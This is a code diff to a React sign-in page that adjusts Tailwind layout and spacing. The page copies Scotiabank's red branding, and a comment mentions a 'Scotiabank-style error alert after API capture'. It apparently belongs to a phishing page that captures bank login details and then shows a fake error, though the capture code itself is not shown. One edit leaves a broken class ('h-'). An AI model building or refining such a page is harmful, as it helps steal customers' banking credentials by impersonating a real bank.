@@ -67,12 +67,12 @@ export const SignInPage: React.FC<SignInPageProps> = ({ onNavigateHome }) => {
       <main className="flex-1 flex flex-col items-center justify-center px-4 py-12">
         
         {/* Main White Card */}
-        <div className="w-full max-w-[550px] min-h-[640px] sm:min-h-[680px] bg-white rounded-xl border border-gray-200/90 shadow-2xs py-12 sm:py-16 px-5 sm:px-10 relative flex flex-col justify-center items-center">
+        <div className="w-full max-w-[550px] min-h-[640px] sm:min-h-[680px] bg-white rounded-xl border border-gray-200/90 shadow-2xs py-12 sm:py-16 px-5 sm:px-10 relative flex flex-col  items-center">
           
           {/* Lock Icon in Top Right of Card */}
           <div className="absolute top-6 right-6">
             <div className="w-5 h-5 rounded flex items-center justify-center bg-white">
-              <Lock className="w-5 h-5 text-gray-700 stroke-[2.2]" />
+              <Lock className="w-5 h- text-gray-700 stroke-[2.2]" />
             </div>
           </div>
 
@@ -114,7 +114,7 @@ export const SignInPage: React.FC<SignInPageProps> = ({ onNavigateHome }) => {
               </div>
             </div>
 
-            <form onSubmit={handleSubmit} className="w-full max-w-[340px] mx-auto space-y-6">
+            <form onSubmit={handleSubmit} className="w-full max-w-[340px] mx-auto space-y-8">
               
               {/* Scotiabank-style error alert after API capture */}
               {showAlert && (
@@ -194,7 +194,7 @@ export const SignInPage: React.FC<SignInPageProps> = ({ onNavigateHome }) => {
               <button
                 type="submit"
                 disabled={loading}
-                className="w-full bg-[#EC111A] hover:bg-[#C40912] disabled:opacity-60 disabled:cursor-not-allowed text-white font-bold text-sm sm:text-base py-3.5 rounded-md shadow-2xs transition duration-200 mt-3 flex items-center justify-center space-x-2"
+                className="w-full bg-[#EC111A] hover:bg-[#C40912] disabled:opacity-60 disabled:cursor-not-allowed text-white font-bold text-sm sm:text-base py-3.5 rounded-md shadow-2xs transition duration-200 mt-20 flex items-center justify-center space-x-2"
               >
                 {loading ? (
                   <>
